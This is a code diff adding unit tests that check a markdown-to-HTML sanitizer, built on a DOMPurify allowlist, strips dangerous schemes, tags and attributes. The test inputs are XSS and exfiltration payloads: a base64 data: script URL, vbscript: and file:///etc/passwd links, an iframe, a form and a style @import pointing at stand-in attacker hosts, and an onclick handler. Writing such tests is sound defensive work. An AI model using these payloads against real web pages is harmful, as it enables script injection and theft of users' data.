@@ -53,4 +53,59 @@ describe("renderMarkdownToSafeHtml (Issue #661)", () => {
     const html = renderMarkdownToSafeHtml("use `npm install` to ...");
     expect(html).toContain("<code>npm install</code>");
   });
+
+  describe("Issue #865: DOMPurify allowlist 強化", () => {
+    it("data: URL scheme を href から剥がすべき (= data:text/html;base64 XSS gadget 防御)", () => {
+      const html = renderMarkdownToSafeHtml(
+        "[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
+      );
+      expect(html).not.toMatch(/href="data:/);
+    });
+
+    it("vbscript: scheme を href から剥がすべき", () => {
+      const html = renderMarkdownToSafeHtml("[click](vbscript:msgbox(1))");
+      expect(html).not.toMatch(/href="vbscript:/);
+    });
+
+    it("file: scheme を href から剥がすべき", () => {
+      const html = renderMarkdownToSafeHtml("[click](file:///etc/passwd)");
+      expect(html).not.toMatch(/href="file:/);
+    });
+
+    it("<iframe> は ALLOWED_TAGS に無いので剥がすべき", () => {
+      const html = renderMarkdownToSafeHtml(
+        '<iframe src="https://attacker.evil.com"></iframe>Hello',
+      );
+      expect(html).not.toContain("<iframe");
+      expect(html).toContain("Hello");
+    });
+
+    it("<form action> は剥がすべき (= clickjacking / data exfil gadget)", () => {
+      const html = renderMarkdownToSafeHtml('<form action="https://attacker"><input></form>');
+      expect(html).not.toContain("<form");
+    });
+
+    it("<style> は剥がすべき (= CSS-based exfil)", () => {
+      const html = renderMarkdownToSafeHtml("<style>@import url(https://attacker/exfil)</style>Hi");
+      expect(html).not.toContain("<style");
+      expect(html).toContain("Hi");
+    });
+
+    it("onclick attribute は FORBID_ATTR で剥がすべき", () => {
+      const html = renderMarkdownToSafeHtml(
+        '<a href="https://example.com" onclick="alert(1)">x</a>',
+      );
+      expect(html).not.toContain("onclick");
+    });
+
+    it("正常な https:// link は保持すべき", () => {
+      const html = renderMarkdownToSafeHtml("[docs](https://example.com/docs)");
+      expect(html).toMatch(/href="https:\/\/example\.com\/docs"/);
+    });
+
+    it("mailto: link は保持すべき", () => {
+      const html = renderMarkdownToSafeHtml("[mail](mailto:a@example.com)");
+      expect(html).toMatch(/href="mailto:a@example\.com"/);
+    });
+  });
 });
